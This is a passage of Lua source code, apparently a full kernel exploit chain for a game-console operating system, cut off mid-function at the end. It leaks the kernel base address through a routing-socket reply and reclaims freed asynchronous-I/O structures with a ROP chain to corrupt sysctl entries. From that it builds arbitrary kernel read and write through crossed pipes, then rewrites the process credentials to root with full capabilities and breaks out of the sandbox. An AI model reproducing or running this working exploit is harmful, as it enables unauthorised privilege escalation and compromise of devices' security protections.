    local out = memory.alloc(0x100)
    local rv = do_sysctl(concat_mib({ 0, 4 }, mib), out, 0x100, nil, 0)
    if rv ~= 0 then return nil end
    return memory.read_dword(out):tonumber()
end

-- kaslr

first_interface_address = function()
    local RECORD, IP = 0x3c0, 40
    local count = sysint(syscall.netgetiflist, nil, 10)
    if count <= 0 or count > 256 then return nil end

    local list = memory.alloc(RECORD * count)
    if sysint(syscall.netgetiflist, list, count) < 0 then return nil end

    for i = 0, count - 1 do
        local nonzero = false
        local octets = {}
        for b = 0, 3 do
            local o = memory.read_byte(list + RECORD * i + IP + b):tonumber()
            octets[b + 1] = o
            if o ~= 0 then nonzero = true end
        end
        if nonzero then return octets end
    end
    return nil
end

local function sockaddr_len(len)
    if len and len ~= 0 then
        return bit32.band(len - 1, bit32.bnot(7)) + 8
    end
    return 8
end

leak_kernel_base = function()
    local DST_LEN = 88
    local AUTHOR = 152 + sockaddr_len(DST_LEN)
    local MSG_LEN = AUTHOR + 256
    local AUTHOR_INDEX = 6
    local RET_SLOT = 184

    local dst = first_interface_address()
    if not dst then error("kaslr: no interface has an address") end

    local fd = sysint(syscall.socket, AF_ROUTE, SOCK_RAW, 0)
    if fd < 0 then error("kaslr: routing socket is gated") end
    table.insert(fds, fd)

    local timeout = memory.alloc(16)
    memory.write_dword(timeout, 5)
    sysint(syscall.setsockopt, fd, 0xffff, 0x20, timeout, 16)

    local msg = memory.alloc(512)
    memory.write_byte(msg, bit32.band(MSG_LEN, 0xff))
    memory.write_byte(msg + 1, bit32.band(bit32.rshift(MSG_LEN, 8), 0xff))
    memory.write_byte(msg + 2, 5) -- rtm_version
    memory.write_byte(msg + 3, 0x04) -- rtm_get
    memory.write_dword(msg + 12, 0x41) -- rta_dst | rta_author
    memory.write_dword(msg + 20, 0x1234) -- rtm_seq
    memory.write_byte(msg + 152, DST_LEN)
    memory.write_byte(msg + 153, AF_INET)
    memory.write_dword(msg + 156, bit32.bor(
        bit32.lshift(dst[4], 24), bit32.lshift(dst[3], 16), bit32.lshift(dst[2], 8), dst[1]))
    memory.write_byte(msg + AUTHOR, 255)
    memory.write_byte(msg + AUTHOR + 1, AF_INET6)

    if sysint(syscall.write, fd, msg, MSG_LEN) < 0 then
        error("kaslr: routing socket rejected the request")
    end

    local reply = memory.alloc(4096)
    local len = 0
    for attempt = 1, 8 do
        len = sysint(syscall.recvfrom, fd, reply, 4096, MSG_DONTWAIT, nil, nil)
        if len > 0 then break end
        sleep(1, "ms")
    end
    if len <= 0 then error("kaslr: no routing reply") end

    local present = memory.read_dword(reply + 12):tonumber()
    local cursor, author = 152, 0
    for i = 0, 7 do
        if bit32.band(present, bit32.lshift(1, i)) ~= 0 then
            if cursor + 2 > len then break end
            if i == AUTHOR_INDEX then
                author = cursor
                break
            end
            cursor = cursor + sockaddr_len(memory.read_byte(reply + cursor):tonumber())
        end
    end
    if author == 0 or author + 200 > len then
        error("kaslr: reply carries no author record")
    end

    local ret = memory.read_qword(reply + author + RET_SLOT)
    if ret.h ~= 0xffffffff or bit32.band(ret.l, 0xffff) ~= bit32.band(off.kaslr.retLow16, 0xffff) then
        error("kaslr: author+" .. RET_SLOT .. " = " .. hex(ret) .. " is not the expected return address")
    end

    kbase = uint64({ h = ret.h, l = (ret.l - off.kaslr.retStatic) % 0x100000000 })
end

-- aio reclaim

raise_fd_limit = function()
    local limit = memory.alloc(0x10)
    if sysint(syscall.getrlimit, RLIMIT_NOFILE, limit) == -1 then return end
    memory.write_qword(limit, memory.read_qword(limit + 8))
    sysint(syscall.setrlimit, RLIMIT_NOFILE, limit)
end

open_socket_pair = function(error_message)
    local buffer = memory.alloc(8)
    if sysint(syscall.socketpair, AF_UNIX, SOCK_STREAM, 0, buffer) == -1 then
        error(error_message)
    end
    local pair = {
        read_fd = memory.read_dword(buffer):tonumber(),
        write_fd = memory.read_dword(buffer + 4):tonumber(),
    }
    table.insert(fds, pair.read_fd)
    table.insert(fds, pair.write_fd)
    return pair
end

submit_blocked_read = function(read_fd)
    local request = memory.alloc(0x40)
    local sink = memory.alloc(0x40)
    local id_out = memory.alloc(8)

    memory.write_dword(request + 0x08, 1)
    memory.write_qword(request + 0x10, sink)
    memory.write_dword(request + 0x20, read_fd)

    local rv = sysint(syscall.aio_submit_cmd, AIO_CMD_READ, request, 1, 3, id_out)
    if rv == 0 then return memory.read_dword(id_out):tonumber() end
    return nil
end

park_aio_workers = function(limit)
    local pair = open_socket_pair("socketpair for the worker park failed")
    worker_park = pair

    local ids = memory.alloc(4 * limit + 8)
    local states = memory.alloc(4 * limit + 8)

    local sent, parked, quiet_rounds = 0, 0, 0
    while sent < limit and quiet_rounds < 2 do
        for i = 1, 4 do
            if sent >= limit then break end
            local id = submit_blocked_read(pair.read_fd)
            if id == nil then return end
            memory.write_dword(ids + sent * 4, id)
            sent = sent + 1
        end

        sleep(60, "ms")
        sysint(syscall.aio_multi_poll, ids, sent, states)

        local in_flight = 0
        for i = 0, sent - 1 do
            if bit32.band(memory.read_dword(states + i * 4):tonumber(), 0xffff) == 2 then
                in_flight = in_flight + 1
            end
        end

        if in_flight == parked then
            quiet_rounds = quiet_rounds + 1
        else
            parked = in_flight
            quiet_rounds = 0
        end
    end
end

wait_for_pending_requests = function(candidate_ids, candidate_count, wanted_count)
    local poll_limit = 16
    local poll_ids = memory.alloc(4 * candidate_count + 8)
    local poll_states = memory.alloc(4 * candidate_count + 8)
    local active_indices = {}
    local pending_indices = {}
    local seen = {}
    local passes, poll_calls, polled_ids = 0, 0, 0
    local started_sec, started_nsec = fast_poll_now()
    if not started_sec then fast_poll_profile.clock_errors = fast_poll_profile.clock_errors + 1 end

    for attempt = 1, 150 do
        if #pending_indices >= wanted_count then break end
        passes = attempt

        -- Preserve selection order and avoid selecting a pending request twice.
        local active_count = 0
        for index = 0, candidate_count - 1 do
            if not seen[index] then
                memory.write_dword(poll_ids + active_count * 4,
                    memory.read_dword(candidate_ids + index * 4))
                active_indices[active_count + 1] = index
                active_count = active_count + 1
            end
        end

        local offset = 0
        while offset < active_count and #pending_indices < wanted_count do
            local batch_count = math.min(poll_limit, active_count - offset)
            sysint(syscall.aio_multi_poll, poll_ids + offset * 4, batch_count, poll_states)
            poll_calls = poll_calls + 1
            polled_ids = polled_ids + batch_count

            for slot = 0, batch_count - 1 do
                local index = active_indices[offset + slot + 1]
                local state = bit32.band(
                    memory.read_dword(poll_states + slot * 4):tonumber(), 0xffff)
                if state == 1 then
                    table.insert(pending_indices, index)
                    seen[index] = true
                    if #pending_indices >= wanted_count then break end
                end
            end
            offset = offset + batch_count
        end

        if #pending_indices < wanted_count then sleep(20, "ms") end
    end

    fast_poll_profile.scans = fast_poll_profile.scans + 1
    fast_poll_profile.calls = fast_poll_profile.calls + poll_calls
    fast_poll_profile.ids = fast_poll_profile.ids + polled_ids
    fast_poll_profile.rounds = fast_poll_profile.rounds + passes
    local ended_sec, ended_nsec = fast_poll_now()
    if not ended_sec then fast_poll_profile.clock_errors = fast_poll_profile.clock_errors + 1 end
    if started_sec and ended_sec then
        local elapsed = (ended_sec - started_sec) + (ended_nsec - started_nsec) / 1000000000
        if elapsed >= 0 then fast_poll_profile.elapsed = fast_poll_profile.elapsed + elapsed end
    end

    if #pending_indices ~= wanted_count then
        error(string.format("%d/%d requests stayed pending", #pending_indices, wanted_count))
    end
    return pending_indices
end

claim_pending_requests = function(count)
    local candidate_count = math.max(count + 8, 0x18)
    local candidate_ids = memory.alloc(4 * candidate_count)

    for index = 0, candidate_count - 1 do
        local pair = open_socket_pair("socketpair failed while claiming requests")
        local id = submit_blocked_read(pair.read_fd)
        if id == nil then error("aio request submission failed") end
        memory.write_dword(candidate_ids + index * 4, id)
    end

    local pending = wait_for_pending_requests(candidate_ids, candidate_count, count)

    local ids = memory.alloc(4 * count)
    for output, index in ipairs(pending) do
        memory.write_dword(ids + (output - 1) * 4, memory.read_dword(candidate_ids + index * 4))
    end

    return { ids = ids, count = count }
end

build_waiter_nodes = function(count, first_target, second_target)
    local request_size = off.aio.requestSize
    local nodes = memory.alloc(count * request_size)
    for i = 0, count - 1 do
        memory.write_dword(nodes + i * request_size + 0x20, 0xffffffff)
    end
    memory.write_qword(nodes, first_target)
    memory.write_qword(nodes + 8, second_target)
    memory.write_qword(nodes + 0x10, kaddr(off.nodeMutex))
    return nodes
end

remember_armed_group = function(group)
    local ids = {}
    for index = 0, group.count - 1 do
        table.insert(ids, memory.read_dword(group.ids + index * 4):tonumber())
    end
    table.insert(armed_groups, ids)
end

run_reclaim_batch = function(group, nodes)
    local started_sec, started_nsec = fast_stage_start()
    local requests = tuning.requests
    local request_size = off.aio.requestSize
    local sprayed_ids = memory.alloc(4 * requests * (tuning.sprays + 1))
    local timeout = memory.alloc(16)
    memory.write_dword(timeout, tuning.waitTimeoutUs)

    local churn_request = bit32.bor(0x80000000, bit32.lshift(requests * request_size, 16), 0x4101)
    fast_stage_stop("reclaim_setup", started_sec, started_nsec)

    started_sec, started_nsec = fast_stage_start()
    local preflight = sysint(syscall.ioctl, -1, churn_request, nodes)
    fast_stage_stop("reclaim_preflight", started_sec, started_nsec)
    if preflight ~= -1 then return nil end

-- this chain needs a larger rop stack than the 0x2000-byte default.
    started_sec, started_nsec = fast_stage_start()
    local chain = ropchain({ stack_size = 0x30000, ops_only = true })
    for i = 1, tuning.churnBefore do
        chain:push_syscall(syscall.ioctl, -1, churn_request, nodes)
    end

    chain:push_syscall(syscall.aio_multi_wait, group.ids, group.count, scratch_states, 0, timeout)

    for i = 1, tuning.churnAfter do
        chain:push_syscall(syscall.ioctl, -1, churn_request, nodes)
    end

    for i = 0, tuning.sprays - 1 do
        chain:push_syscall_with_ret(syscall.aio_submit_cmd, AIO_CMD_READ, nodes, requests, 3,
            sprayed_ids + i * 4 * requests)
    end

    chain:restore_through_longjmp()
    fast_stage_stop("reclaim_chain_build", started_sec, started_nsec)

    started_sec, started_nsec = fast_stage_start()
    chain:execute_through_coroutine()
    fast_stage_stop("reclaim_chain_execute", started_sec, started_nsec)

    started_sec, started_nsec = fast_stage_start()
    local accepted = 0
    for i = 1, tuning.sprays do
        if memory.read_dword(chain.retval_addr[i]):tonumber() == 0 then
            accepted = accepted + 1
        end
    end
    fast_stage_stop("reclaim_result_check", started_sec, started_nsec)
    fast_stage_profile.reclaim_chain_ops = (fast_stage_profile.reclaim_chain_ops or 0)
        + tuning.churnBefore + 1 + tuning.churnAfter + tuning.sprays
    return accepted
end

cancel_request = function(group, index)
    return sysint(syscall.aio_multi_cancel, group.ids + index * 4, 1, scratch_states)
end

first_pending_request = function(group)
    sysint(syscall.aio_multi_poll, group.ids, group.count, scratch_states)
    for index = 0, group.count - 1 do
        local state = bit32.band(memory.read_dword(scratch_states + index * 4):tonumber(), 0xffff)
        if state == 1 then
            local canary = group.count - 1
            if canary ~= index then cancel_request(group, canary) end
            return index
        end
    end
    return -1
end

reclaim_waiter_array = function(tag, first_target, second_target)
    local started_sec, started_nsec = fast_stage_start()
    local group = claim_pending_requests(tuning.waiters)
    fast_stage_stop("reclaim_claim", started_sec, started_nsec)
    remember_armed_group(group)

    local nodes = build_waiter_nodes(tuning.requests, first_target, second_target)
    started_sec, started_nsec = fast_stage_start()
    local accepted = run_reclaim_batch(group, nodes)
    fast_stage_stop("reclaim_batch", started_sec, started_nsec)
    if accepted == nil then
        report(tag, "invalid churn request")
        return nil
    end
    if accepted ~= tuning.sprays then
        report(tag, (tuning.sprays - accepted) .. " reclaim submits failed")
        return nil
    end

    started_sec, started_nsec = fast_stage_start()
    local first_pending = first_pending_request(group)
    fast_stage_stop("reclaim_first_pending", started_sec, started_nsec)
    if first_pending < 0 then
        report(tag, "no pending request is available")
        return nil
    end

    return { group = group, first_pending = first_pending, heads = group.count - 1 }
end

flip_oid_kind = function(tag, reclaim, mib, target)
    local started_sec, started_nsec = fast_stage_start()
    local kind = oid_kind(mib)
    if kind == nil then
        fast_stage_stop("flip_oid_kind", started_sec, started_nsec)
        report(tag, "oid is hidden before the flip")
        return false
    end

    local i, cancel_count = 0, 0
    while i < reclaim.heads and kind ~= target do
        cancel_request(reclaim.group, i)
        cancel_count = cancel_count + 1
        local next_kind = oid_kind(mib)
        if next_kind == nil then
            fast_stage_stop("flip_oid_kind", started_sec, started_nsec)
            fast_stage_profile.flip_cancels = (fast_stage_profile.flip_cancels or 0) + cancel_count
            report(tag, "oid disappeared during the flip")
            return false
        end
        kind = next_kind
        if bit32.band(bit32.rshift(kind, 24), 0xff) < bit32.band(bit32.rshift(target, 24), 0xff) then
            fast_stage_stop("flip_oid_kind", started_sec, started_nsec)
            fast_stage_profile.flip_cancels = (fast_stage_profile.flip_cancels or 0) + cancel_count
            report(tag, "oid flip overshot into oid_arg1")
            return false
        end
        i = i + 1
    end

    if kind ~= target then
        report(tag, "not enough waiter heads")
        fast_stage_stop("flip_oid_kind", started_sec, started_nsec)
        fast_stage_profile.flip_cancels = (fast_stage_profile.flip_cancels or 0) + cancel_count
        return false
    end
    fast_stage_stop("flip_oid_kind", started_sec, started_nsec)
    fast_stage_profile.flip_cancels = (fast_stage_profile.flip_cancels or 0) + cancel_count
    return true
end

local function make_oid_writable_impl(tag, mib, kind_byte_rva)
    local a = off.oid.a
    local kind = oid_kind(mib)
    if kind ~= off.oid.originalKind then
        report(tag, "unexpected oid kind " .. (kind == nil and "missing" or string.format("%x", kind)))
        return false
    end

    local reclaim = reclaim_waiter_array(tag, kaddr(a.deadSink), kaddr(kind_byte_rva))
    if not reclaim then return false end
    return flip_oid_kind(tag, reclaim, mib, off.oid.writableKind)
end
make_oid_writable = make_oid_writable_impl

-- slow kernel read/write

set_window_low = function(value)
    return sysctl_write_int(mib_a, bit32.band(value, 0xffffffff))
end

set_window_high = function(value)
    if mib_c then
        return sysctl_write_int(mib_c, bit32.band(value, 0xffffffff))
    end
    if window_high ~= 0xffffffff then return -1 end

    local self_high = kaddr(off.oid.b.arg1 + 4)
    local rv = set_window_low(self_high.l)
    if rv ~= 0 then return rv end
    return sysctl_write_int(mib_b, bit32.band(value, 0xffffffff))
end

aim_window = function(address)
    local high = address.h
    if window_high ~= high then
        local rv = set_window_high(high)
        if rv ~= 0 then return rv end
        window_high = high
    end
    return set_window_low(address.l)
end

kread32 = function(address)
    if aim_window(address) ~= 0 then return -1, 0 end
    return sysctl_read_int(mib_b)
end

kwrite32 = function(address, value)
    if aim_window(address) ~= 0 then return -1 end
    return sysctl_write_int(mib_b, bit32.band(value, 0xffffffff))
end

kread64 = function(address)
    local rv_lo, lo = kread32(address)
    local rv_hi, hi = kread32(address + 4)
    local rv = (rv_lo == 0 and rv_hi == 0) and 0 or -1
    return rv, uint64({ h = hi, l = lo })
end

kwrite64 = function(address, value)
    local rv = kwrite32(address, value.l)
    if rv ~= 0 then return rv end
    return kwrite32(address + 4, value.h)
end

prepare_high_writer = function()
    local c, b = off.oid.c, off.oid.b
    if window_high ~= 0xffffffff then
        report("kernel rw", "writer window already left the kernel image")
        return false
    end
    if kwrite32(kaddr(c.kind), off.oid.writableKind) ~= 0 then return false end
    if kwrite64(kaddr(c.arg1), kaddr(b.arg1 + 4)) ~= 0 then return false end

    local probe_rv, probe_value = sysctl_read_int(c.mib)
    if probe_rv ~= 0 or bit32.band(probe_value, 0xffffffff) ~= 0xffffffff then
        report("kernel rw", "high writer self-test failed")
        return false
    end
    mib_c = c.mib
    return true
end

steer_oid_window = function()
    local a, b = off.oid.a, off.oid.b
    if oid_kind(mib_b) ~= nil then
        report("Kernel", "oid is already visible")
        return false
    end

    local a_rv = sysctl_read_int(mib_a)
    if a_rv ~= 0 then
        report("Kernel", "steering oid is not readable")
        return false
    end

    local reclaim = reclaim_waiter_array("Kernel", kaddr(a.arg1Byte1), kaddr(b.visible))
    if not reclaim then return false end

    cancel_request(reclaim.group, reclaim.first_pending)

    local steered_rv, steered_value = sysctl_read_int(mib_a)
    local expected = bit32.band(kaddr(b.arg1Value).l, 0xffffffff)
    if steered_rv ~= 0 or bit32.band(steered_value, 0xffffffff) ~= expected then
        report("Kernel", "oid steering check failed")
        return false
    end

    window_high = 0xffffffff
    return true
end

test_kernel_read = function()
    local b = off.oid.b
    local kind_via_oidfmt = oid_kind(mib_b)
    local read_rv, read_value = kread32(kaddr(b.kind))
    local ok = kind_via_oidfmt ~= nil and read_rv == 0 and read_value == kind_via_oidfmt
    if not ok then report("Kernel", "read self-test failed") end
    return ok
end

test_kernel_write = function()
    local counter = kaddr(off.walkCounter.addr)
    local mib = off.walkCounter.mib
    local before_rv, before_value = sysctl_read_int(mib)
    local rv = kwrite32(counter, 0x41424344)
    local after_rv, after_value = sysctl_read_int(mib)
    local ok = rv == 0 and bit32.band(after_value, 0xffffffff) == 0x41424344
    if ok then
        kwrite32(counter, bit32.band(before_value, 0xffffffff))
    else
        report("Kernel", "write self-test failed")
    end
    return ok
end

arm_kernel_read_write = function()
    local a, b = off.oid.a, off.oid.b

    mib_a = name_to_mib("kern.smp.cpus")
    mib_b = name_to_mib("kern.smp.maxcpus")
    if not mib_a or not mib_b or oid_kind(mib_a) ~= off.oid.originalKind then
        report("Kernel", "unexpected oid state")
        return false
    end

    local started_sec, started_nsec = fast_stage_start()
    raise_fd_limit()
    fast_stage_stop("raise_fd_limit", started_sec, started_nsec)

    started_sec, started_nsec = fast_stage_start()
    park_aio_workers(tuning.workerBlockers)
    fast_stage_stop("park_aio_workers", started_sec, started_nsec)

    started_sec, started_nsec = fast_stage_start()
    local writable_a = make_oid_writable("arm a", mib_a, a.kindByte3)
    fast_stage_stop("make_oid_writable_a", started_sec, started_nsec)
    if not writable_a then return false end

    started_sec, started_nsec = fast_stage_start()
    local steered = steer_oid_window()
    fast_stage_stop("steer_oid_window", started_sec, started_nsec)
    if not steered then return false end

    started_sec, started_nsec = fast_stage_start()
    local read_ok = test_kernel_read()
    fast_stage_stop("test_kernel_read", started_sec, started_nsec)
    if not read_ok then return false end

    started_sec, started_nsec = fast_stage_start()
    local writable_c = make_oid_writable("arm c", mib_b, b.kindByte3)
    fast_stage_stop("make_oid_writable_c", started_sec, started_nsec)
    if not writable_c then return false end

    started_sec, started_nsec = fast_stage_start()
    local write_ok = test_kernel_write()
    fast_stage_stop("test_kernel_write", started_sec, started_nsec)
    if not write_ok then return false end

    started_sec, started_nsec = fast_stage_start()
    local writer_ready = prepare_high_writer()
    fast_stage_stop("prepare_high_writer", started_sec, started_nsec)
    return writer_ready
end

-- process discovery

read_kernel_pointer_slow = function(address)
    local rv, value = kread64(address)
    if rv == 0 and is_kernel_pointer(value) then return value end
    return nil
end

find_process = function(target_pid)
    local head = read_kernel_pointer_slow(kaddr(off.allproc))
    if not head then
        report("Process", "allproc is not a kernel pointer")
        return nil
    end

    local proc = head
    for hop = 1, 4096 do
        local rv, pid_raw = kread32(proc + off.proc.pid)
        if rv ~= 0 then return nil end
        local pid_value = to_int32(pid_raw)
        if pid_value < 0 or pid_value > 0x40000 then
            report("Process", "invalid pid while walking allproc")
            return nil
        end
        if pid_value == target_pid then return proc end

        local next_proc = read_kernel_pointer_slow(proc)
        if not next_proc then return nil end
        proc = next_proc
    end
    return nil
end

find_current_process = function()
    local my_pid = sysint(syscall.getpid)
    local proc = find_process(my_pid)
    if not proc then
        report("Process", "current process is not in allproc")
        return false
    end
    curproc = proc

    local _, fd_value = kread64(curproc + off.proc.fd)
    if is_kernel_pointer(fd_value) then proc_fd_addr = fd_value end

    local aio_rv, aio_info_value = kread64(curproc + off.proc.aioInfo)
    local _, ucred_value = kread64(curproc + off.proc.ucred)
    if is_kernel_pointer(ucred_value) then ucred_addr = ucred_value end

    local ok = aio_rv == 0 and is_kernel_pointer(aio_info_value)
    if ok then
        ok_msg("aio_info_addr: " .. hex(aio_info_value))
    else
        report("Process", "aio info pointer is invalid")
    end
    if ucred_addr then ok_msg("ucred_addr: " .. hex(ucred_addr)) end
    return ok
end

-- fast kernel read/write

find_pipe = function(fdp, fd, label)
    local table_addr = read_kernel_pointer_slow(fdp + off.filedesc.files)
    if not table_addr then
        report("Pipes", label .. " file table is invalid")
        return nil
    end

    local count_rv, count_value = kread32(table_addr + off.filedescTable.nfiles)
    if count_rv ~= 0 or fd >= count_value then
        report("Pipes", label .. " descriptor is outside the file table")
        return nil
    end

    local entry = off.filedescTable.ofiles + fd * off.filedescTable.entryStride
    local file_addr = read_kernel_pointer_slow(table_addr + entry)
    if not file_addr then
        report("Pipes", label .. " file pointer is invalid")
        return nil
    end

    local pipe_addr = read_kernel_pointer_slow(file_addr + off.filedescTable.fileData)
    if not pipe_addr then
        report("Pipes", label .. " pipe pointer is invalid")
        return nil
    end

    local pair_rv, pair_value = kread64(pipe_addr + off.pipe.pair)
    local is_read_end = pair_rv == 0 and pair_value.h == pipe_addr.h and pair_value.l == pipe_addr.l

    return { file = file_addr, pipe = pipe_addr, is_read_end = is_read_end }
end

locate_pipes = function()
    local fdp = read_kernel_pointer_slow(curproc + off.proc.fd)
    if not fdp then
        report("Pipes", "process file table is invalid")
        return false
    end

    local probe = memory.alloc(8)
    local located = {}

    for _, label in ipairs({ "master", "victim" }) do
        local read_fd, write_fd = create_pipe()
        sysint(syscall.fcntl, read_fd, F_SETFL, O_NONBLOCK_FLAG)
        sysint(syscall.fcntl, write_fd, F_SETFL, O_NONBLOCK_FLAG)
        table.insert(fds, read_fd)
        table.insert(fds, write_fd)

        local info = find_pipe(fdp, read_fd, label)
        if not info then return false end
        if not info.is_read_end then
            report("Pipes", label .. " pipe self-check failed")
            return false
        end

        memory.write_dword(probe, 0x5a)
        sysint(syscall.write, write_fd, probe, 1)

        local _, count_value = kread32(info.pipe + off.pipe.count)
        if count_value ~= 1 then
            report("Pipes", label .. " pipe counter check failed")
            return false
        end

    -- keep the write end's file pointer for cleanup.
        local write_info = find_pipe(fdp, write_fd, label)
        if not write_info then return false end

        table.insert(located, {
            read_fd = read_fd, write_fd = write_fd, pipe = info.pipe,
            read_file = info.file, write_file = write_info.file,
        })
    end

    master = located[1]
    victim = located[2]
    return true
end

aim_victim = function(address, count, size)
    local C, S, B = off.pipe.count, off.pipe.size, off.pipe.buffer
    clear_buffer(aim_buffer, 0x18)
    memory.write_dword(aim_buffer + C, bit32.band(count, 0xffffffff))
    memory.write_dword(aim_buffer + S, bit32.band(size, 0xffffffff))
    memory.write_qword(aim_buffer + B, address)

    local written = sysint(syscall.write, master.write_fd, aim_buffer, 0x18)
    local drained = sysint(syscall.read, master.read_fd, drain_buffer, 0x18)
    return (written == 0x18 and drained == 0x18) and 0 or -1
end

kread_fast = function(address, length, dest)
    if aim_victim(address, length, pipe_size) ~= 0 then return -1 end
    return sysint(syscall.read, victim.read_fd, dest, length)
end

kwrite_fast = function(address, length, src)
    if aim_victim(address, 0, pipe_size) ~= 0 then return -1 end
    return sysint(syscall.write, victim.write_fd, src, length)
end

read_kernel32 = function(address)
    if kread_fast(address, 4, scratch_qword) == 4 then
        return memory.read_dword(scratch_qword):tonumber()
    end
    return -1
end

read_kernel64 = function(address)
    if kread_fast(address, 8, scratch_qword) == 8 then
        return memory.read_qword(scratch_qword)
    end
    return uint64(0)
end

write_kernel32 = function(address, value)
    memory.write_dword(scratch_qword, value)
    return kwrite_fast(address, 4, scratch_qword) == 4
end

write_kernel64 = function(address, value, high)
    local low, hi
    -- a pslua uint64 is a {h, l} table, a compat uint64 is a userdata.
    -- callers pass one whole pointer (rootvnode) as well as a low, high pair.
    if is_uint64(value) then
        low, hi = value.l, value.h
    elseif type(value) == "table" and value.l ~= nil then
        low, hi = value.l, value.h
    else
        low, hi = value, high
    end
    memory.write_dword(scratch_qword, bit32.band(low, 0xffffffff))
    memory.write_dword(scratch_qword + 4, bit32.band(hi, 0xffffffff))
    return kwrite_fast(address, 8, scratch_qword) == 8
end

cross_pipes = function()
    local master_pipe = master.pipe
    local victim_pipe = victim.pipe
    local count_off, in_off, out_off, size_off, buffer_off =
        off.pipe.count, off.pipe["in"], off.pipe.out, off.pipe.size, off.pipe.buffer

    pipe_size = off.pipe.defaultSize
    aim_buffer = memory.alloc(0x20)
    drain_buffer = memory.alloc(0x40)

    local master_rv, master_buffer = kread64(master_pipe + buffer_off)
    local master_size_rv, master_size = kread32(master_pipe + size_off)
    local victim_rv, victim_buffer = kread64(victim_pipe + buffer_off)
    local victim_size_rv, victim_size = kread32(victim_pipe + size_off)
    if master_rv ~= 0 or master_size_rv ~= 0 or victim_rv ~= 0 or victim_size_rv ~= 0 then
        report("Pipes", "could not save the original pipe buffers")
        return false
    end
    saved_pipe_buffers = {
        master = master_buffer, master_size = master_size,
        victim = victim_buffer, victim_size = victim_size,
    }

    local in_rv, in_value = kread32(master_pipe + in_off)
    local _, out_value = kread32(master_pipe + out_off)
    if in_rv ~= 0 or in_value ~= 1 or out_value ~= 0 then
        report("pipes", "master pipe is not in the expected state")
        return false
    end
    sysint(syscall.read, master.read_fd, drain_buffer, 1)

    local fields = {
        { count_off, 0 },
        { in_off, 0 },
        { out_off, 0 },
        { size_off, pipe_size },
        { buffer_off, bit32.band(victim_pipe.l, 0xffffffff) },
        { buffer_off + 4, bit32.band(victim_pipe.h, 0xffffffff) },
    }
    for _, field in ipairs(fields) do
        local offset, value = field[1], field[2]
        local ok = false
        for attempt = 1, 3 do
            if ok then break end
            kwrite32(master_pipe + offset, value)
            local read_rv, read_value = kread32(master_pipe + offset)
            ok = read_rv == 0 and read_value == bit32.band(value, 0xffffffff)
        end
        if not ok then
            report("Pipes", "could not update the master pipe")
            return false
        end
    end
    crossed = true

    local rva, text = off.rodataProbe.rva, off.rodataProbe.text
    local out = memory.alloc(0x40)
    local got = kread_fast(kaddr(rva), #text, out)
    local read_back = memory.read_buffer(out, #text)

    local match = got == #text and read_back == text
    if not match then report("Pipes", "kernel read check failed") end
    return match
end

-- privileges

escalate = function()
    if not crossed or not ucred_addr then
        report("Privileges", "kernel rw or credentials are missing")
        return false
    end

    local rootvnode = read_kernel_pointer_slow(kaddr(off.rootvnode))
    if not rootvnode then
        report("Privileges", "could not find rootvnode")
        return false
    end

    local ucred, sys_core_auth_id, filedesc, dynlib, proc =
        off.ucred, off.sysCoreAuthId, off.filedesc, off.dynlib, off.proc
    local cred = ucred_addr

    write_kernel32(cred + ucred.uid, 0)
    write_kernel32(cred + ucred.ruid, 0)
    write_kernel32(cred + ucred.svuid, 0)
    write_kernel32(cred + ucred.ngroups, 1)
    write_kernel32(cred + ucred.rgid, 0)
    write_kernel32(cred + ucred.svgid, 0)
    write_kernel64(cred + ucred.sceAuthId, sys_core_auth_id.lo, sys_core_auth_id.hi)
    write_kernel64(cred + ucred.sceCaps, 0xffffffff, 0xffffffff)
    write_kernel64(cred + ucred.sceCaps1, 0xffffffff, 0xffffffff)

    local attrs_low = read_kernel32(cred + ucred.sceAttrs)
    local attrs_high = read_kernel32(cred + ucred.sceAttrs + 4)
    write_kernel64(cred + ucred.sceAttrs, bit32.bor(bit32.band(attrs_low, 0x00ffffff), 0x80000000), attrs_high)

    local _, fdp = kread64(curproc + proc.fd)
    write_kernel64(fdp + filedesc.cdir, rootvnode)
    write_kernel64(fdp + filedesc.rdir, rootvnode)
    write_kernel64(fdp + filedesc.jdir, 0, 0)

    local _, dynlib_ptr = kread64(curproc + proc.dynlib)
    if is_kernel_pointer(dynlib_ptr) then
        write_kernel64(dynlib_ptr + dynlib.syscallStart, 0, 0)
        write_kernel64(dynlib_ptr + dynlib.syscallEnd, 0xffffffff, 0xffffffff)
        write_kernel32(dynlib_ptr + dynlib.restrictFlags, 0)
        write_kernel64(dynlib_ptr + dynlib.libkernelRef, 1, 0)

        -- dlsym checks the caller against the eboot segment bounds.
        local _, eboot_ptr = kread64(dynlib_ptr)
        if is_kernel_pointer(eboot_ptr) then
            local _, segments_ptr = kread64(eboot_ptr + 0x40)
            if is_kernel_pointer(segments_ptr) then
                local _, orig_addr = kread64(segments_ptr + 0x08)
                local _, orig_size = kread64(segments_ptr + 0x10)
                write_kernel64(segments_ptr + 0x08, 0, 0)
                write_kernel64(segments_ptr + 0x10, 0xffffffff, 0xffffffff)
                eboot_segments_ptr = segments_ptr
                eboot_orig_addr = orig_addr
                eboot_orig_size = orig_size
            end
        end
    else
        report("Privileges", "dynlib pointer is invalid")
    end

    local uid_after = sysint(syscall.getuid)
    local sandbox_after = sysint(syscall.is_in_sandbox)
    local ok = uid_after == 0 and sandbox_after == 0
    if not ok then report("Privileges", "uid or sandbox check failed") end
    return ok
end

-- aio cleanup

-- rescue can run before fast pipe r/w is ready, so use sysctl for cleanup until then.
local function group_read32(address)
    if not crossed then return kread32(address) end
    if kread_fast(address, 4, scratch_qword) == 4 then
        return 0, memory.read_dword(scratch_qword):tonumber()
    end
    return -1, 0
end

local function group_read64(address)
    if not crossed then return kread64(address) end
    if kread_fast(address, 8, scratch_qword) == 8 then
        return 0, memory.read_qword(scratch_qword)
    end
    return -1, uint64(0)
end

local function group_read_block(address, length, dest)
    if length % 4 ~= 0 then return -1 end
    if crossed then
        if kread_fast(address, length, dest) == length then return 0 end
        return -1
    end
    for offset = 0, length - 1, 4 do
        local rv, value = kread32(address + offset)
        if rv ~= 0 then return -1 end
        memory.write_dword(dest + offset, value)
    end
    return 0
end

local function group_write32(address, value)
    if not crossed then return kwrite32(address, value) end
    memory.write_dword(scratch_qword, bit32.band(value, 0xffffffff))
    if kwrite_fast(address, 4, scratch_qword) == 4 then return 0 end
    return -1
end

local function group_write64(address, value)
    if not crossed then return kwrite64(address, value) end
    memory.write_qword(scratch_qword, value)
    if kwrite_fast(address, 8, scratch_qword) == 8 then return 0 end
    return -1
end

local function clear_aio_waiters_batch(candidates)
    local count = #candidates
    if count == 0 then return 0, 0 end

    local function clear_one(shared)
        local ok = false
        for attempt = 1, 3 do
